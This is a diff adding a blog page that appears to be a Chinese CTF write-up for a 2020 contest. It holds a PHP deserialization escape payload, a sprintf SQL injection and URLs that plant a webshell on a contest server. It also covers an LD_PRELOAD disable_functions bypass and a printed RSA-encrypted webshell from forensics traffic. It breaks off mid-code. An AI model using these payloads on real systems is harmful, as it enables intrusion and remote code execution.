@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>安恒杯四月月赛题解</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/&title=安恒杯四月月赛题解" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/&title=安恒杯四月月赛题解" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/&text=安恒杯四月月赛题解" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=安恒杯四月月赛题解&body=Check out this article: http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-Ezunserialize"><span class="toc-number">1.1.</span> <span class="toc-text">0x 01 Ezunserialize</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-babytricks"><span class="toc-number">2.</span> <span class="toc-text">0x 02 babytricks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-6G还远吗？"><span class="toc-number">3.1.</span> <span class="toc-text">0x 01 6G还远吗？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-02-blueshark"><span class="toc-number">3.2.</span> <span class="toc-text">0x 02 blueshark</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-keyboard"><span class="toc-number">4.</span> <span class="toc-text">0x 03 keyboard</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-04-awdshell"><span class="toc-number">4.1.</span> <span class="toc-text">0x 04 awdshell</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        安恒杯四月月赛题解
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-25T12:58:00.000Z" itemprop="datePublished">2020-04-25</time>
+        
+        (Updated: <time datetime="2020-04-30T16:36:16.437Z" itemprop="dateModified">2020-05-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/ctfwp/">ctfwp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/%E5%AE%89%E6%81%92%E6%9D%AF/" rel="tag">安恒杯</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-Ezunserialize"><a href="#0x-01-Ezunserialize" class="headerlink" title="0x 01 Ezunserialize"></a>0x 01 Ezunserialize</h4><ul>
+<li><p>考点</p>
+<p>字符串逃逸</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li>题目给了源代码，进行审计发现需要构造pop链然后字符逃逸</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    function __construct($a, $b)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $a;</span><br><span class="line">        $this-&gt;password &#x3D; $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $b &#x3D; &#39;gqy&#39;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $c &#x3D; &#39;a&#39;.$this-&gt;b;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        &#x2F;&#x2F;flag.php</span><br><span class="line">        echo file_get_contents($this-&gt;c);</span><br><span class="line">        return &#39;nice&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);</span><br><span class="line">&#x2F;&#x2F;省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line">$b &#x3D; unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure>
+
+<p>首先是构造pop链如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$b &#x3D; new B();</span><br><span class="line">$c &#x3D; new C();</span><br><span class="line">$c-&gt;c &#x3D; &#39;flag.php&#39;;</span><br><span class="line">$b-&gt;b &#x3D; $c;</span><br><span class="line">$x &#x3D; serialize($b);</span><br><span class="line">echo $x;</span><br></pre></td></tr></table></figure>
+
+<p>得到：<code>O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}</code></p>
+<p>接着是反序列化逃逸对象，本地调试发现当我们传入：<code>a=1&amp;b=1</code>时候得到的pop链是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>当我们注入一个对象时：<code>&quot;;s:0:&quot;&quot;;O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;s:1:&quot;1&quot;;}}</code>得到的pop链是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:38:&quot;&quot;;s:0:&quot;&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;1&quot;;&#125;&#125;&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我们需要逃逸出<code>&quot;;s:8:&quot;password&quot;;s:38:&quot;</code>23个字符</p>
+<p>审计代码我们可以发现<code>\0\0\0</code>的长度为6，然后<code>chr(0).&#39;*&#39;.chr(0)</code>的长度为3，因此<code>read()</code>方法可以造成字符逃逸，最终造成对象注入。</p>
+<p>但是这里需要是3的倍数，在payload里面加个1，最终payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;;s:0:&quot;</span><br></pre></td></tr></table></figure>
+
+<p>最后加上空字符串闭合结尾的引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot;********&quot;;s:8:&quot;password&quot;;s:86:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;;s:0:&quot;&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注入我们pop链对象</p>
+<h3 id="0x-02-babytricks"><a href="#0x-02-babytricks" class="headerlink" title="0x 02 babytricks"></a>0x 02 babytricks</h3><ul>
+<li><p>考点</p>
+<p>SQL注入</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<p>1、题目源代码处得到提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tips:select * from user where user&#x3D;&#39;$user&#39; and passwd&#x3D;&#39;%s&#39;--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、利用sprintf()格式化字符串漏洞注入账号密码，参考这篇文章：<a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/80485075</a></p>
+<p>%1可以吃掉username后面那个单引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql &#x3D; sprintf (&quot;select * from user where user&#x3D;&#39;%1$&#39; and passwd&#x3D;&#39;%s&#39;&quot;,&#39;^0#&#39;);</span><br><span class="line">echo $sql;</span><br><span class="line">&#x2F;&#x2F; select * from user where user&#x3D;&#39;nd passwd&#x3D;&#39;^0#&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200425214441221.png" alt></p>
+<p>使用admin/GoODLUcKcTFer202OHAckFuN登录<a href="http://183.129.189.60:10027/admin/admin.php" target="_blank" rel="noopener">http://183.129.189.60:10027/admin/admin.php</a> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Your sandbox: .&#x2F;shells&#x2F;Ex5xRmjE666uzon5&#x2F; set your shell</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_save_path(&#39;session&#39;);</span><br><span class="line">session_start();</span><br><span class="line">require_once &#39;.&#x2F;init.php&#39;;</span><br><span class="line">if($_SESSION[&#39;login&#39;]!&#x3D;1)&#123;</span><br><span class="line">    die(&quot;&lt;script&gt;window.location.href&#x3D;&#39;.&#x2F;index.php&#39;&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#39;shell&#39;])&#123;</span><br><span class="line">    $shell&#x3D; addslashes($_GET[&#39;shell&#39;]);</span><br><span class="line">    $file &#x3D; file_get_contents(&#39;.&#x2F;shell.php&#39;);</span><br><span class="line">    $file &#x3D; preg_replace(&quot;&#x2F;\\\$shell &#x3D; &#39;.*&#39;;&#x2F;s&quot;, &quot;\$shell &#x3D; &#39;&#123;$shell&#125;&#39;;&quot;, $file);</span><br><span class="line">    file_put_contents(&#39;.&#x2F;shell.php&#39;, $file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;set your shell&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    chdir(&quot;&#x2F;&quot;);</span><br><span class="line">    highlight_file(dirname(__FILE__).&quot;&#x2F;admin.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参考<a href="https://www.smi1e.top/小密圈经典写配置漏洞与几种变形学习/" target="_blank" rel="noopener">[小密圈]经典写配置漏洞与几种变形学习</a></p>
+<p>分别访问：</p>
+<ul>
+<li><a href="http://183.129.189.60:10006/admin/admin.php?shell=;eval($_POST[c])" target="_blank" rel="noopener">http://183.129.189.60:10006/admin/admin.php?shell=;eval($_POST[c])</a>;</li>
+<li><a href="http://183.129.189.60:10006/admin/admin.php?shell=$0" target="_blank" rel="noopener">http://183.129.189.60:10006/admin/admin.php?shell=$0</a></li>
+</ul>
+<p>写入shell</p>
+<p>链接蚁剑，发现存在disable_function和openbasedir，php版本是7.4.5，有一个文件查看的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$arr&#x3D;scandir(&quot;..&quot;);</span><br><span class="line">foreach($arr as $value)&#123;</span><br><span class="line">    print_r($value.&quot;\n&quot;);</span><br><span class="line">    $arr2&#x3D;@scandir(&quot;..&#x2F;&quot;.$value);</span><br><span class="line">    if($arr2)&#123;</span><br><span class="line">        if(sizeof($arr2)&gt;3)&#123;</span><br><span class="line">            print_r(scandir(&quot;..&#x2F;&quot;.$value));</span><br><span class="line">            print_r(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据这两篇文章：</p>
+<p><a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/?nsukey=JBhjc2PnpeklWfY6zzLcMY8ItEKB4kIkTgTcR7TV1YXSmHn5GGocvDWh9nEe9D055d4NIDs1hH%2B8qtxURg0DMvqjoUx6VwoB6RRIWcuekAxsvpmCkLDTxZ%2FUBlC8d5XvuOzqUcKm5V7JVkjYHDeouqLAUZ0TVyw2mUKzj2RLl%2Bg9bWlDE9B5%2FW4IHX2d3ikd1btmOhAqPJk21CfxM0dBFg%3D%3D" target="_blank" rel="noopener">Fuzzer gets us new functions to bypass PHP disable_functions</a></p>
+<p><a href="https://www.anquanke.com/post/id/197745?from=singlemessage" target="_blank" rel="noopener">PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数</a></p>
+<p>结果如下：</p>
+<p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429143940031.png" alt></p>
+<p>在phpinfo中存在gnupg这个扩展</p>
+<p><img src="https://img.cjm00n.top/20200425194145.png" alt="img"></p>
+<p>利用  <code>gnupg_init();</code>函数触发即可</p>
+<p>或者是<code>$gpg = new gnupg();</code></p>
+<p>利用脚本：<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p>参考：<a href="https://cjm00n.top/CTF/dasctf-2020-04-wp.html" target="_blank" rel="noopener">https://cjm00n.top/CTF/dasctf-2020-04-wp.html</a></p>
+<p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200501003358437.png" alt></p>
+<p>另外能触发<code>ld_preload</code>的函数还有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mb_send_mail</span><br><span class="line">exec</span><br><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">shell_exec</span><br><span class="line">error_log</span><br><span class="line">mail</span><br><span class="line">gnupg_init</span><br><span class="line">imap_mail</span><br><span class="line">pcntl_exec</span><br><span class="line">new gnupg()</span><br></pre></td></tr></table></figure>
+
+<p>需要根据相应的扩展进行修改</p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x-01-6G还远吗？"><a href="#0x-01-6G还远吗？" class="headerlink" title="0x 01 6G还远吗？"></a>0x 01 6G还远吗？</h4><p>断点下载，打开文件得到flag</p>
+<h4 id="0x-02-blueshark"><a href="#0x-02-blueshark" class="headerlink" title="0x 02 blueshark"></a>0x 02 blueshark</h4><p>根据题目提示，过滤obex协议，发现存在一个7z的压缩包。binwalk导出</p>
+<p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429160848649.png" alt></p>
+<p>然后看文件名猜到可能要蓝牙的PIN码才能得到，然后导出7z，再从流量包字符串搜索找到PIN值</p>
+<p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429160741397.png" alt></p>
+<p>解压得到flag</p>
+<h3 id="0x-03-keyboard"><a href="#0x-03-keyboard" class="headerlink" title="0x 03 keyboard"></a>0x 03 keyboard</h3><p>首先是内存取证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">volatility -f Keyboard.raw imageinfo</span><br><span class="line">volatility -f Keyboard.raw --profile&#x3D;Win7SP1x64 filescan | grep txt</span><br><span class="line">volatility -f Keyboard.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000003d700880 -n--dump&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<p><img src="https://uploader.shimo.im/f/yQvpPVRHchkOWLPz.png!thumbnail" alt="img"></p>
+<p>键盘加密：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string1 &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">string2 &#x3D; &quot;QWERTYUIOPASDFGHJKLZXCVBNM&quot;</span><br><span class="line">str &#x3D; &#39;CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA&#39;</span><br><span class="line">print(str.translate(str.maketrans(string2,string1)))</span><br></pre></td></tr></table></figure>
+
+<p>得到解密明文<code>VERACRYPTPASSWORDISKEYBOARDDRAOBYEK</code>用了<code>VERACRYPT</code>的工具，密码是<code>KEYBOARDDRAOBYEK</code></p>
+<p>ntfs数据流解密得到flag</p>
+<h4 id="0x-04-awdshell"><a href="#0x-04-awdshell" class="headerlink" title="0x 04 awdshell"></a>0x 04 awdshell</h4><p>先导出http对象得到源文件，发现存在木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; @$_POST[&#39;ant&#39;];</span><br><span class="line">$pk &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds &#x3D; explode(&quot;|&quot;, $cmd);</span><br><span class="line">$pk &#x3D; openssl_pkey_get_public($pk);</span><br><span class="line">$cmd &#x3D; &#39;&#39;;</span><br><span class="line">foreach ($cmds as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $cmd .&#x3D; $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval($cmd);</span><br></pre></td></tr></table></figure>
+
+<p>写出对应的解码代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&#39;&#39;;&#x2F;&#x2F;fang mi wen</span><br><span class="line">$pk &#x3D; &#39;-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----&#39;;</span><br><span class="line">$strs &#x3D; explode(&quot;|&quot;, $str);</span><br><span class="line">$pk &#x3D; openssl_pkey_get_public($pk);</span><br><span class="line">$str &#x3D; &#39;&#39;;</span><br><span class="line">foreach ($strs as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $str .&#x3D; $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>解码对应的数据包得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">	@session_start();</span><br><span class="line">	$key&#x3D;@substr(str_pad(session_id(),16,&#39;a&#39;),0,16);</span><br><span class="line">	return @base64_encode(openssl_encrypt(base64_encode($out), &#39;AES-128-ECB&#39;, $key, 